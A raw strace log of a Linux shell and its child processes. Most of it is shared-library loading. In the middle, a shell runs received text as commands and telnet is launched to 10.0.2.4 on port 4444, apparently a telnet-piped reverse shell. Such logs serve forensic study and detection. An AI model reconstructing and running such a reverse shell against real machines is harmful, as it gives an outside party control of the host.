\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
+29846 15:04:56.658331 fstat64(7, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+29846 15:04:56.658361 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7e03000
+29846 15:04:56.658377 mmap2(0xb7e0a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x6) = 0xb7e0a000
+29846 15:04:56.658395 close(7)          = 0
+29846 15:04:56.658407 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.658421 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 7
+29846 15:04:56.658436 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
+29846 15:04:56.658526 fstat64(7, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+29846 15:04:56.658544 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7deb000
+29846 15:04:56.658556 mmap2(0xb7dff000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x13) = 0xb7dff000
+29846 15:04:56.658571 mmap2(0xb7e01000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e01000
+29846 15:04:56.658587 close(7)          = 0
+29846 15:04:56.658613 munmap(0xb7f91000, 29913) = 0
+29846 15:04:56.658631 open("/etc/ld.so.cache", O_RDONLY) = 7
+29846 15:04:56.658644 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29846 15:04:56.658661 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7f91000
+29846 15:04:56.658672 close(7)          = 0
+29846 15:04:56.658682 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.658698 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 7
+29846 15:04:56.658712 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29846 15:04:56.658808 fstat64(7, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+29846 15:04:56.658825 brk(0x80ff000)    = 0x80ff000
+29846 15:04:56.658838 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7de1000
+29846 15:04:56.658861 mmap2(0xb7de9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x7) = 0xb7de9000
+29846 15:04:56.658919 close(7)          = 0
+29846 15:04:56.658932 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29846 15:04:56.658947 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 7
+29846 15:04:56.658962 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
+29846 15:04:56.659054 fstat64(7, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+29846 15:04:56.659072 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7dd6000
+29846 15:04:56.659084 mmap2(0xb7ddf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x8) = 0xb7ddf000
+29846 15:04:56.659100 close(7)          = 0
+29846 15:04:56.659122 munmap(0xb7f91000, 29913) = 0
+29846 15:04:56.659138 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 7
+29846 15:04:56.659153 fcntl64(7, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+29846 15:04:56.659165 _llseek(7, 0, [0], SEEK_CUR) = 0
+29846 15:04:56.659177 fstat64(7, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
+29846 15:04:56.659195 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 7, 0) = 0xb7f98000
+29846 15:04:56.659206 _llseek(7, 1624, [1624], SEEK_SET) = 0
+29846 15:04:56.659221 munmap(0xb7f98000, 1624) = 0
+29846 15:04:56.659231 close(7)          = 0
+29846 15:04:56.659255 brk(0x8100000)    = 0x8100000
+29846 15:04:56.659273 getpgrp()         = 3831
+29846 15:04:56.659283 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+29846 15:04:56.659298 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
+29846 15:04:56.659315 brk(0x8101000)    = 0x8101000
+29846 15:04:56.659357 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.659375 fcntl64(0, F_GETFL) = 0 (flags O_RDONLY)
+29846 15:04:56.659388 fstat64(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+29846 15:04:56.659406 _llseek(0, 0, 0xbfced860, SEEK_CUR) = -1 ESPIPE (Illegal seek)
+29846 15:04:56.659418 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.659435 read(0, "T", 1)   = 1
+29846 15:04:56.659447 read(0, "r", 1)   = 1
+29846 15:04:56.659457 read(0, "y", 1)   = 1
+29846 15:04:56.659467 read(0, "i", 1)   = 1
+29846 15:04:56.659477 read(0, "n", 1)   = 1
+29846 15:04:56.659487 read(0, "g", 1)   = 1
+29846 15:04:56.659497 read(0, " ", 1)   = 1
+29846 15:04:56.659507 read(0, "1", 1)   = 1
+29846 15:04:56.659517 read(0, "0", 1)   = 1
+29846 15:04:56.659527 read(0, ".", 1)   = 1
+29846 15:04:56.659537 read(0, "0", 1)   = 1
+29846 15:04:56.659546 read(0, ".", 1)   = 1
+29846 15:04:56.659556 read(0, "2", 1)   = 1
+29846 15:04:56.659566 read(0, ".", 1)   = 1
+29846 15:04:56.659576 read(0, "4", 1)   = 1
+29846 15:04:56.659586 read(0, ".", 1)   = 1
+29846 15:04:56.659596 read(0, ".", 1)   = 1
+29846 15:04:56.659606 read(0, ".", 1)   = 1
+29846 15:04:56.659616 read(0, "\n", 1)  = 1
+29846 15:04:56.659647 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29846 15:04:56.659666 stat64("/sbin/Trying", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.659679 stat64("/bin/Trying", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.659691 stat64("/usr/sbin/Trying", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.659704 stat64("/usr/bin/Trying", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.659718 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29846 15:04:56.659733 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e0c6f8) = 29847
+29847 15:04:56.659780 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29847 15:04:56.659799 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29847 15:04:56.659820 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29847 15:04:56.659835 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29847 15:04:56.659851 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29847 15:04:56.659868 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29847 15:04:56.659881 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29847 15:04:56.659937 write(2, "sh: line 1: Trying: command not found\n", 38) = 38
+29847 15:04:56.659996 exit_group(127)   = ?
+29842 15:04:56.660032 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.660046 close(7)          = 0
+29842 15:04:56.660055 close(8)          = 0
+29842 15:04:56.660064 close(7)          = -1 EBADF (Bad file descriptor)
+29842 15:04:56.660074 close(8)          = -1 EBADF (Bad file descriptor)
+29842 15:04:56.660091 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+29842 15:04:56.660106 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc6f8) = 29848
+29848 15:04:56.660153 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29848 15:04:56.660167 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29848 15:04:56.660180 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29848 15:04:56.660193 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29848 15:04:56.660225 dup2(1, 0)        = 0
+29848 15:04:56.660236 close(1)          = 0
+29848 15:04:56.660275 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29848 15:04:56.660296 stat64("/sbin/telnet", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660307 stat64("/bin/telnet", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660307 stat64("/usr/sbin/telnet", 0xbfeddb18) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660308 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+29848 15:04:56.660308 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+29848 15:04:56.660308 brk(0x8103000)    = 0x8103000
+29848 15:04:56.660308 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+29848 15:04:56.660309 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29848 15:04:56.660309 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29848 15:04:56.660309 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+29848 15:04:56.660309 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29848 15:04:56.660309 open("/dev/null", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 1
+29848 15:04:56.660310 dup2(1, 2)        = 2
+29848 15:04:56.660313 fcntl64(1, F_GETFD) = 0
+29848 15:04:56.660326 execve("/usr/bin/telnet", ["telnet", "10.0.2.4", "4444"], [/* 14 vars */]) = 0
+29848 15:04:56.660396 brk(0)            = 0x805d000
+29848 15:04:56.660415 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660430 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f38000
+29848 15:04:56.660446 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660463 open("/etc/ld.so.cache", O_RDONLY) = 7
+29848 15:04:56.660476 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
+29848 15:04:56.660493 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7f30000
+29848 15:04:56.660516 close(7)          = 0
+29848 15:04:56.660527 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660543 open("/lib/libncurses.so.5", O_RDONLY) = 7
+29848 15:04:56.660556 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
+29848 15:04:56.660650 fstat64(7, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+29848 15:04:56.660668 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7f00000
+29848 15:04:56.660681 mmap2(0xb7f2d000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x2c) = 0xb7f2d000
+29848 15:04:56.660697 close(7)          = 0
+29848 15:04:56.660710 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660724 open("/usr/lib/libstdc++.so.6", O_RDONLY) = 7
+29848 15:04:56.660739 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`*\4\0004\0\0\0\10\313\16\0\0\0\0\0004\0 \0\7\0(\0\36\0\35\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340|\16\0\340|\16\0\5\0\0\0\0\20\0\0\1\0\0\0000\211\16\0000\211\16\0000\211\16\0\300@\0\0\334\235\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\272\16\0\34\272\16\0\34\272\16\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\7\0\0\0000\211\16\0000\211\16\0000\211\16\0\0\0\0\0\10\0\0\0\4\0\0\0\4\0\0\0P\345td\364>\f\0\364>\f\0\364>\f\0004F\0\0004F\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td0\211\16\0000\211\16\0000\211\16\0\3046\0\0\3046\0\0\4\0\0\0\1\0\0\0\377\3\0\0\0\r\0\0S\5\0\0\17\v\0\0\331\n\0\0{\3\0\0v\v\0\0\f\6\0\0\340\6\0\0\351\1\0\0\362\n\0\0P\0\0\0\305\7\0\0\212\t\0\0&\4\0\0i\0\0\0+\v\0\0\0\0\0\0\322\6\0\0\0\0\0\0L\0\0\0\22\v\0\0\350\t\0\0\367\f\0\0I\5\0\0\263\n\0\0\t\10\0\0\3\0\0\0\326\t\0\0{\2\0\0M\v\0\0a\6\0\0\314\t\0\0\0\0\0\0/\1\0\0\364\2\0\0\374\4\0\0\362\f\0\0\330\2\0\0\321\4\0\0P\4\0\0U\5\0\0\314\2\0\0\354\2\0\0\0\v\0\0\356\2\0\0R\6\0\0\363\2\0\0\t\f\0\0X\1\0\0@\2\0\0\256\10\0\0g\n\0\0C\7\0\0\330\t\0\0D\t\0\0\0\0\0\0\251\1\0\0\'\n\0\0", 512) = 512
+29848 15:04:56.660831 fstat64(7, {st_mode=S_IFREG|0644, st_size=970680, ...}) = 0
+29848 15:04:56.660849 mmap2(NULL, 993036, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7e0d000
+29848 15:04:56.660861 mmap2(0xb7ef5000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0xe8) = 0xb7ef5000
+29848 15:04:56.660876 mmap2(0xb7efa000, 22284, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7efa000
+29848 15:04:56.660891 close(7)          = 0
+29848 15:04:56.660903 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.660916 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 7
+29848 15:04:56.660931 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
+29848 15:04:56.661026 fstat64(7, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
+29848 15:04:56.661045 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e0c000
+29848 15:04:56.661058 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7de7000
+29848 15:04:56.661069 mmap2(0xb7e0a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x23) = 0xb7e0a000
+29848 15:04:56.661085 close(7)          = 0
+29848 15:04:56.661097 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.661112 open("/lib/libgcc_s.so.1", O_RDONLY) = 7
+29848 15:04:56.661125 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\31\0\0004\0\0\0\224\242\0\0\0\0\0\0004\0 \0\5\0(\0\33\0\32\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\350\236\0\0\350\236\0\0\5\0\0\0\0\20\0\0\1\0\0\0\0\240\0\0\0\240\0\0\0\240\0\0\250\1\0\0\344\2\0\0\6\0\0\0\0\20\0\0\2\0\0\0\24\240\0\0\24\240\0\0\24\240\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0P\345tdl\224\0\0l\224\0\0l\224\0\0\244\1\0\0\244\1\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0a\0\0\0m\0\0\0\0\0\0\0001\0\0\0`\0\0\0\0\0\0\0\34\0\0\0=\0\0\0\0\0\0\0)\0\0\0?\0\0\0*\0\0\0O\0\0\0\0\0\0\0008\0\0\0A\0\0\0003\0\0\0\0\0\0\0\0\0\0\0V\0\0\0g\0\0\0\0\0\0\0\0\0\0\0005\0\0\0T\0\0\0\0\0\0\0\0\0\0\0-\0\0\0\0\0\0\0b\0\0\0W\0\0\0\0\0\0\0d\0\0\0\r\0\0\0\0\0\0\0c\0\0\0\3\0\0\0 \0\0\0&\0\0\0009\0\0\0N\0\0\0\23\0\0\0\0\0\0\0(\0\0\0J\0\0\0j\0\0\0\0\0\0\0\0\0\0\0\26\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0\0\0\0\0\36\0\0\0+\0\0\0\'\0\0\0Q\0\0\0\0\0\0\0%\0\0\0\"\0\0\0\n\0\0\0\0\0\0\0_\0\0\0\35\0\0\0\0\0\0\0\0\0\0\0l\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\6\0\0\0,\0\0\0\0\0\0\0\0\0\0\0\t\0\0\0", 512) = 512
+29848 15:04:56.661214 fstat64(7, {st_mode=S_IFREG|0644, st_size=42700, ...}) = 0
+29848 15:04:56.661232 mmap2(NULL, 41700, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7ddc000
+29848 15:04:56.661243 mmap2(0xb7de6000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0xa) = 0xb7de6000
+29848 15:04:56.661256 close(7)          = 0
+29848 15:04:56.661268 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.661285 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
